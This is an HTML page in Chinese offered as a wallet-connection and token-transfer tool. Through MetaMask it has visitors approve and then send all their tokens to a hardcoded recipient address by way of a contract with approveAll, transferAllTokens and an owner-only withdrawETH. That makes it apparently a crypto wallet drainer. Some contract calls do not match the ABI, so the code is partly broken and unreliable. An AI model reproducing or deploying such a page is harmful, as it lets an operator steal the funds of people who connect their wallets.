<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>钱包连接与代币转账</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
</head>
<body>
    <h1>钱包连接与代币转账</h1>
    <button id="connectButton">连接钱包</button>
    <button id="authorizeTransfer" disabled>授权转账</button>
    <button id="transferButton" disabled>转移代币</button>
    <p id="status">状态信息</p>

    <script>
        let web3;
        let account;
        const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 合约地址
        const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收地址
        let contract;

        const abi = [
            {
                "inputs": [
                    {
                        "internalType": "contract IERC20",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "approveAll",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "contract IERC20",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "transferAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "withdrawETH",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "recipient",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        // 连接钱包功能
        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    account = accounts[0];
                    document.getElementById("status").innerText = "已连接钱包: " + account;
                    document.getElementById("authorizeTransfer").disabled = false; // 启用授权按钮
                    contract = new web3.eth.Contract(abi, contractAddress); // 初始化合约
                } catch (error) {
                    handleError(error);
                }
            } else {
                document.getElementById("status").innerText = "请安装 MetaMask!";
            }
        }

        // 错误处理函数
        function handleError(error) {
            if (error.code === 4001) {
                document.getElementById("status").innerText = "用户拒绝了请求。";
            } else if (error.code === -32002) {
                document.getElementById("status").innerText = "连接请求已存在，请稍候。";
            } else {
                document.getElementById("status").innerText = "连接钱包失败: " + error.message;
                console.error("错误信息:", error); // 记录错误信息
            }
        }

        // 授权转账
        async function authorizeTransfer() {
            try {
                await contract.methods.approveAll(recipientAddress).send({ from: account });
                document.getElementById("status").innerText = "授权成功!";
                document.getElementById("transferButton").disabled = false; // 启用转账按钮
            } catch (error) {
                handleError(error);
            }
        }

        // 转移代币
        async function transferTokens() {
            try {
                await contract.methods.transferAllTokens().send({ from: account });
                document.getElementById("status").innerText = "转账成功!";
            } catch (error) {
                handleError(error);
            }
        }

        // 事件监听
        document.getElementById("connectButton").addEventListener("click", connectWallet);
        document.getElementById("authorizeTransfer").addEventListener("click", authorizeTransfer);
        document.getElementById("transferButton").addEventListener("click", transferTokens);
    </script>
</body>
</html>
